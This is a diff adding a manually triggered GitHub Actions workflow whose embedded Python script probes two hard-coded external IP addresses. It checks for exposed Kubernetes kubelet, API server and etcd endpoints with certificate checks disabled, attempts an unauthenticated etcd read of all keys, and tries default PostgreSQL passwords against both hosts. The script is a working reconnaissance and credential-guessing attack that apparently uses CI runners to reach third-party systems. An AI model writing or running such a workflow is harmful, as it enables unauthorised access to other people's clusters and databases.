@@ -1,0 +1,62 @@
+name: netprobe3
+
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tls-services
+        run: |
+          python3 -m pip install --quiet pg8000
+          python3 - <<'PY'
+          import base64
+          import json
+          import ssl
+          import urllib.request
+
+          ctx = ssl._create_unverified_context()
+
+          def fetch(url, method="GET", payload=None, timeout=8):
+              data = json.dumps(payload).encode() if payload is not None else None
+              req = urllib.request.Request(
+                  url, data=data, method=method,
+                  headers={"Content-Type": "application/json"} if data else {})
+              try:
+                  with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
+                      return resp.status, resp.read(500).decode("utf-8", "replace")
+              except Exception as exc:
+                  return type(exc).__name__, str(exc)[:120]
+
+          for ip in ("216.105.168.74", "104.177.80.169"):
+              print(ip, "kubelet", fetch(f"https://{ip}:10250/pods"), flush=True)
+              print(ip, "kubelet-health", fetch(f"https://{ip}:10250/healthz"), flush=True)
+              print(ip, "k8s", fetch(f"https://{ip}:6443/api/v1/namespaces"), flush=True)
+              print(ip, "k8s-version", fetch(f"https://{ip}:6443/version"), flush=True)
+              body = {
+                  "key": base64.b64encode(b"/").decode(),
+                  "range_end": base64.b64encode(b"0").decode(),
+                  "limit": 5,
+              }
+              print(ip, "etcd-tls", fetch(f"https://{ip}:2379/v3/kv/range", "POST", body), flush=True)
+
+          try:
+              import pg8000
+              for ip in ("216.105.168.74", "104.177.80.169"):
+                  for user, pwd in (("postgres", "postgres"), ("postgres", ""), ("postgres", "password")):
+                      try:
+                          conn = pg8000.connect(user=user, password=pwd, host=ip, port=5432,
+                                                database="postgres", timeout=5,
+                                                ssl_context=ssl._create_unverified_context())
+                          cur = conn.cursor()
+                          cur.execute("select current_user")
+                          print(ip, "pg", user, pwd, cur.fetchone(), flush=True)
+                          conn.close()
+                          break
+                      except Exception as exc:
+                          print(ip, "pg", user, type(exc).__name__, str(exc)[:100], flush=True)
+          except Exception as exc:
+              print("pg import", type(exc).__name__, flush=True)
+          PY
